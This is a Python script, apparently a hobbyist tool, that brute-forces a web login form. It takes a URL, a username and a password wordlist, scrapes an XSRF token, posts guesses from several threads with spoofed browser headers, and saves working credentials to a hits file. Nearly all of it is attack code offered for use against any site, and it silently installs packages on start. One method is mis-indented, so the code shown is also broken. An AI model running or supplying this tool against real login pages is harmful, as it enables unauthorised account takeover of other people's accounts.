# --- Auto-install dependencies ---
import subprocess
import sys

required = ['requests', 'beautifulsoup4', 'colorama', 'keyboard']
for package in required:
    try:
        subprocess.check_call(
            [sys.executable, "-m", "pip", "install", package],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            shell=True
        )
    except subprocess.CalledProcessError as e:
        print(f"[❌] Failed to install {package}: {e}")

import requests
from bs4 import BeautifulSoup
import time
import argparse
import threading
import queue
from colorama import init, Fore
import keyboard
import string
import base64
from urllib.parse import urlparse, parse_qs

init(autoreset=True)

USE_EMOJIS = False

def type_out(text, delay=0.03):
    for char in text:
        try:
            sys.stdout.write(char)
        except UnicodeEncodeError:
            sys.stdout.write('?')
        sys.stdout.flush()
        time.sleep(delay)
    print()

class SimpleBruteForcer:
    def __init__(self, url, username, wordlist, threads=5):
        self.url = url
        self.username = username
        self.wordlist = wordlist
        self.threads = threads
        self.passwords = queue.Queue()
        self.success_flag = threading.Event()
        self.paused = threading.Event()
        self.paused.clear()
        self.stop_flag = threading.Event()
        self.load_wordlist()

    def load_wordlist(self):
        try:
            with open(self.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    cleaned = ''.join(char for char in line.strip() if char in string.printable)
                    if cleaned:
                        self.passwords.put(cleaned)
        except KeyboardInterrupt:
            print(Fore.RED + "\n[💀] Wordlist loading interrupted by user.")

    def log_hit(self, username, password):
        try:
            with open("hits.txt", "a", encoding='utf-8') as f:
                f.write(f"[HIT] {self.url} | username: {username} | password: {password}\n")
        except Exception as e:
            print(Fore.GREEN + f"[Log Error] Failed to write hit: {e}")

    def attempt_login(self, session, password):
    try:
        print(Fore.CYAN + f"[🧠] Starting login attempt for {self.username}...")

        # Re-fetch XSRF token and update headers
        login_page = session.get(self.url, headers={"User-Agent": "Mozilla/5.0"})
        soup = BeautifulSoup(login_page.text, 'html.parser')

        xsrf_token = session.cookies.get("xsrf_token") or soup.find("input", {"name": "xsrf_token"})
        if hasattr(xsrf_token, 'get'):  # if it's a tag
            xsrf_token = xsrf_token.get("value")

        if not xsrf_token:
            print(Fore.YELLOW + "[❌] Missing XSRF token, skipping.")
            return False

        # Update login POST URL if needed
        parsed = urlparse(self.url)
        post_url = f"{parsed.scheme}://{parsed.netloc}/accounts/v2/password"

        payload = {
            "username": self.username,
            "password": password,
            "xsrf_token": xsrf_token
        }

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Referer": self.url,
            "Origin": f"{parsed.scheme}://{parsed.netloc}",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        print(Fore.YELLOW + f"[🚪] Trying password: {password}")
        response = session.post(post_url, data=payload, headers=headers, timeout=10)

        with open("last_response.html", "w", encoding='utf-8') as f:
            f.write(response.text)

        if response.status_code == 200 and ("/welcome" in response.url or "dashboard" in response.text):
            print(Fore.GREEN + f"[✅] Found working password: {password}")
            self.log_hit(self.username, password)
            self.success_flag.set()
            return True
        else:
            print(Fore.RED + f"[❌] Rejected password: {password}")
            return False

    except Exception as e:
        print(Fore.RED + f"[Error] Login exception: {e}")
        return False
        
        
    def worker(self):
        while not self.passwords.empty() and not self.success_flag.is_set() and not self.stop_flag.is_set():
            if self.paused.is_set():
                time.sleep(0.5)
                continue

            password = self.passwords.get()
            print(Fore.YELLOW + f"[THREAD] Trying: {password}")
            session = requests.Session()
            if self.attempt_login(session, password):
                return
            time.sleep(1.5)  # throttle thread loop too

    def control_listener(self):
        print(Fore.GREEN + "[🎮] Control listener active: CTRL+P = pause/resume, CTRL+C = quit.")
        while not self.stop_flag.is_set() and not self.success_flag.is_set():
            try:
                if keyboard.is_pressed("ctrl+p"):
                    if self.paused.is_set():
                        print(Fore.GREEN + "\n▶️ Resuming attack...")
                        self.paused.clear()
                    else:
                        print(Fore.GREEN + "\n⏸️ Pausing attack...")
                        self.paused.set()
                    time.sleep(1)
                elif keyboard.is_pressed("ctrl+c"):
                    print(Fore.RED + "\n[💥] CTRL+C detected. Exiting now...")
                    self.stop_flag.set()
                    sys.exit(0)
            except:
                continue
            time.sleep(0.1)

    def run(self):
        try:
            print(Fore.GREEN + f"🚀 Launching brute-force with {self.threads} threads")
            listener = threading.Thread(target=self.control_listener, daemon=True)
            listener.start()

            thread_list = []
            for _ in range(self.threads):
                t = threading.Thread(target=self.worker)
                t.start()
                thread_list.append(t)

            for t in thread_list:
                t.join()

            if not self.success_flag.is_set():
                print(Fore.RED + "❌ No valid password found.")
        except KeyboardInterrupt:
            print(Fore.RED + "\n[!] CTRL+C detected. Stopping threads...")
            self.stop_flag.set()

if __name__ == "__main__":
    print(Fore.GREEN + r"""
   ____             _       _                
  |  _ \ ___  _ __ | |_ ___| |__   ___ _ __  
  | |_) / _ \| '_ \| __/ __| '_ \ / _ \ '__| 
  |  _ < (_) | |_) | || (__| | | |  __/ |    
  |_| \_\___/| .__/ \__\___|_| |_|\___|_|    
             |_|      v1.1 by joshyboo25
""")

    type_out(Fore.GREEN + ("Script started"))

    parser = argparse.ArgumentParser(description="Stylized brute-force example")
    parser.add_argument("url", help="Login URL")
    parser.add_argument("username", help="Username to target")
    parser.add_argument("wordlist", help="Password wordlist file")
    parser.add_argument("--threads", type=int, default=5, help="Number of threads (default is 5)")
    args = parser.parse_args()

    type_out(Fore.GREEN + ("Connecting to: " + args.url))
    type_out(Fore.GREEN + ("Username: " + args.username))
    type_out(Fore.GREEN + ("Wordlist: " + args.wordlist + "\n"))

    bf = SimpleBruteForcer(args.url, args.username, args.wordlist, args.threads)
    bf.run()






